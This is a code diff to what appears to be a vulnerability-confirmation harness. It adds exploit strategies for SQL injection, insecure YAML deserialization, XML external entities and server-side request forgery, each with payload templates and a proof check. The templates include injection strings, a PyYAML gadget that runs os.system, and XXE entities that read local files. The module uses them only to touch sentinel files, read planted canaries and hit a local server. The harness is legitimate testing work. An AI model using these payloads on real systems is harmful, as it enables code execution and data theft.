@@ -98,6 +98,8 @@ class ProofContext:
     proof_db: str
     secret_file: str
     canary: str
+    ssrf_url: str = ""   # set by the SSRF strategy's setup() to its local server
+    sql_proof: str = ""  # sentinel written by the seeded vulcan_proof() SQL function
 
     @classmethod
     def new(cls) -> "ProofContext":
@@ -109,6 +111,7 @@ class ProofContext:
             proof_file=os.path.join(base, f"pwned_{nonce}"),
             proof_db=os.path.join(base, f"pwn_{nonce}.db"),
             secret_file=os.path.join(base, f"secret_{nonce}.txt"),
+            sql_proof=os.path.join(base, f"sqlproof_{nonce}"),
         )
 
     def render(self, template: str) -> str:
@@ -118,9 +121,16 @@ class ProofContext:
                 .replace("__SECRET__", self.secret_file)
                 .replace("__CANARY__", self.canary)
                 .replace("__NONCE__", self.nonce)
+                .replace("__SSRFURL__", self.ssrf_url)
                 .replace("__EXTSO__", _ensure_proof_extension() or "/nonexistent_tier2_proofext.so"))
 
     def cleanup(self) -> None:
+        srv = getattr(self, "_ssrf_srv", None)
+        if srv is not None:
+            try:
+                srv.shutdown(); srv.server_close()
+            except Exception:  # noqa: BLE001
+                pass
         import shutil
         try:
             shutil.rmtree(self.base, ignore_errors=True)
@@ -233,6 +243,17 @@ CWE94 = _CodeInjection(
 # honestly come back NOT_CONFIRMED here rather than over-claimed.)
 # ---------------------------------------------------------------------------
 class _SqlInjection(ExploitStrategy):
+    def setup(self, ctx):
+        # Publish the env contract sinks.py reads when it seeds each live
+        # sqlite connection (see _tier2_seed_live_connection): a canary row in
+        # table vulcan_seed, and a vulcan_proof() function that writes
+        # ctx.sql_proof. This lets single-statement `execute` injections be
+        # proven by a side effect instead of needing the candidate to return
+        # its result -- the main driver of the previously-unconfirmed CWE-89
+        # samples (execute / count_where / _execute_query).
+        os.environ["TIER2_SQL_CANARY"] = ctx.canary
+        os.environ["TIER2_SQL_PROOF"] = ctx.sql_proof
+
     def verify(self, ctx, result):
         # (a) side-effect proof: injected ATTACH created a DB with table 'pwned'
         if os.path.exists(ctx.proof_db):
@@ -246,8 +267,16 @@ class _SqlInjection(ExploitStrategy):
                     return True, f"injected SQL ATTACHed {ctx.proof_db} and CREATEd table 'pwned'"
             except sqlite3.Error:
                 pass
-        # (b) output proof (needs output capture): a UNION / standalone SELECT
-        # injection made the query return our attacker-chosen canary.
+        # (b) side-effect proof (no output capture needed): an injected
+        # statement called the seeded vulcan_proof() function, which wrote the
+        # sentinel. This is what proves a single-statement execute() injection
+        # (e.g. `INSERT INTO vulcan_seed SELECT vulcan_proof()`) even when the
+        # candidate discards the query result.
+        if ctx.sql_proof and os.path.exists(ctx.sql_proof):
+            return True, "injected SQL invoked attacker-reachable function vulcan_proof() (sentinel written)"
+        # (c) output proof (needs output capture): a UNION / standalone SELECT
+        # injection made the query return our attacker-chosen canary -- either a
+        # literal canary or the canary read out of the seeded vulcan_seed table.
         if ctx.canary in _output_text(result):
             return True, f"injected SQL returned attacker-chosen canary {ctx.canary} in the query result"
         return False, ""
@@ -265,10 +294,34 @@ CWE89 = _SqlInjection(
         "; ATTACH DATABASE '__PROOFDB__' AS pwn; CREATE TABLE pwn.pwned(x); --",
         "x'); ATTACH DATABASE '__PROOFDB__' AS pwn; CREATE TABLE pwn.pwned(x); -- ",
         "1; ATTACH DATABASE '__PROOFDB__' AS pwn; CREATE TABLE pwn.pwned(x); --",
-        # (b) data-return exfil (needs output capture). A standalone SELECT for
+        # (b) EAGER side-effect via the seeded vulcan_proof() function (no
+        # output capture needed). For sinks where the param IS the whole query:
+        # an INSERT runs completely on execute() (DML needs no fetch), so the
+        # function fires and writes the sentinel even if the candidate discards
+        # the result. This is what lifts single-statement execute() injections
+        # out of the "needs a returned result" trap.
+        "INSERT INTO vulcan_seed(secret) SELECT vulcan_proof()",
+        "SELECT vulcan_proof()",
+        # WHERE-clause position (e.g. count_where): the param is spliced into
+        # `... WHERE <param>`, so a whole-statement payload is a syntax error.
+        # These fit a boolean/expression slot. The UNION form fires
+        # vulcan_proof() regardless of the base table's row count (the second
+        # SELECT is always evaluated); the OR form fires it per row (the
+        # referenced table is auto-created with one seeded row in live mode).
+        "1 UNION SELECT vulcan_proof() -- ",
+        "1 UNION SELECT secret FROM vulcan_seed -- ",
+        "0) UNION SELECT vulcan_proof() -- ",
+        "1=1 OR vulcan_proof() IS NOT NULL -- ",
+        # (c) data-return exfil (needs output capture). A standalone SELECT for
         # sinks where the param IS the whole query; UNION variants (several
-        # column counts) for sinks that splice the param into a SELECT.
+        # column counts) for sinks that splice the param into a SELECT. The
+        # vulcan_seed variants read the planted canary ROW (proves reading data
+        # the query was never meant to expose), the literal variants prove
+        # attacker-chosen output.
         "SELECT '__CANARY__'",
+        "SELECT secret FROM vulcan_seed",
+        "' UNION SELECT secret FROM vulcan_seed -- ",
+        "' UNION SELECT vulcan_proof() -- ",
         "' UNION SELECT '__CANARY__' -- ",
         "' UNION SELECT '__CANARY__',NULL -- ",
         "' UNION SELECT '__CANARY__',NULL,NULL -- ",
@@ -328,4 +381,98 @@ CWE22 = _PathTraversal(
 )
 
 
-STRATEGIES = {s.cwe: s for s in (CWE78, CWE94, CWE89, CWE22)}
+# ---------------------------------------------------------------------------
+# CWE-502 -- insecure deserialization. Observable: a serialized payload whose
+# deserialization under an unsafe loader executes code that creates the proof
+# file. The classic PyYAML RCE gadget; fires only when the code uses an unsafe
+# loader (yaml.load / UnsafeLoader), so yaml.safe_load stays NOT_CONFIRMED.
+# ---------------------------------------------------------------------------
+class _Deserialization(ExploitStrategy):
+    def verify(self, ctx, result):
+        if os.path.exists(ctx.proof_file):
+            return True, f"insecure deserialization executed code, creating {ctx.proof_file}"
+        return False, ""
+
+
+CWE502 = _Deserialization(
+    cwe="CWE-502", name="insecure-deserialization",
+    goal="supply a serialized payload whose deserialization executes code creating __PROOF__",
+    templates=[
+        "!!python/object/apply:os.system [\"touch __PROOF__\"]",
+        "!!python/object/apply:os.system ['touch __PROOF__']",
+        "!!python/object/apply:subprocess.getoutput [\"touch __PROOF__\"]",
+        "!!python/object/new:os.system [\"touch __PROOF__\"]",
+    ],
+)
+
+
+# ---------------------------------------------------------------------------
+# CWE-611 -- XML external entity. Observable (via output capture): a DOCTYPE
+# external entity reads a planted canary file and the canary comes back in the
+# parsed result. Fires only when the parser actually resolves external
+# entities, so a safe/default parser stays NOT_CONFIRMED.
+# ---------------------------------------------------------------------------
+class _XXE(ExploitStrategy):
+    def setup(self, ctx):
+        try:
+            with open(ctx.secret_file, "w") as fh:
+                fh.write(ctx.canary)
+        except OSError:
+            pass
+
+    def verify(self, ctx, result):
+        if ctx.canary in _output_text(result):
+            return True, f"XXE external entity exfiltrated the planted canary from {ctx.secret_file}"
+        return False, ""
+
+
+CWE611 = _XXE(
+    cwe="CWE-611", name="xml-external-entity",
+    goal="supply XML whose external entity reads __SECRET__ so its contents (__CANARY__) are returned",
+    templates=[
+        '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "__SECRET__">]><r>&x;</r>',
+        '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file://__SECRET__">]><r>&x;</r>',
+    ],
+)
+
+
+# ---------------------------------------------------------------------------
+# CWE-918 -- server-side request forgery. Observable: the program makes a real
+# HTTP request to a server WE control (a throwaway localhost HTTP server on an
+# ephemeral port), proving attacker control of the request target.
+# ---------------------------------------------------------------------------
+class _SSRF(ExploitStrategy):
+    def setup(self, ctx):
+        import http.server, threading
+        received = set()
+        nonce = ctx.nonce
+
+        class _H(http.server.BaseHTTPRequestHandler):
+            def _hit(self):
+                received.add(self.path.lstrip("/").split("?")[0])
+                self.send_response(200); self.end_headers(); self.wfile.write(b"ok")
+            do_GET = _hit
+            do_POST = _hit
+            def log_message(self, *a):  # silence
+                pass
+
+        srv = http.server.HTTPServer(("127.0.0.1", 0), _H)
+        threading.Thread(target=srv.serve_forever, daemon=True).start()
+        ctx.ssrf_url = f"http://127.0.0.1:{srv.server_address[1]}/{nonce}"
+        ctx._ssrf_srv = srv
+        ctx._ssrf_received = received
+
+    def verify(self, ctx, result):
+        if ctx.nonce in getattr(ctx, "_ssrf_received", set()):
+            return True, f"SSRF: program fetched the attacker-controlled URL {ctx.ssrf_url}"
+        return False, ""
+
+
+CWE918 = _SSRF(
+    cwe="CWE-918", name="server-side-request-forgery",
+    goal="cause the program to make an HTTP request to the attacker URL __SSRFURL__",
+    templates=["__SSRFURL__"],
+)
+
+
+STRATEGIES = {s.cwe: s for s in (CWE78, CWE94, CWE89, CWE22, CWE502, CWE611, CWE918)}
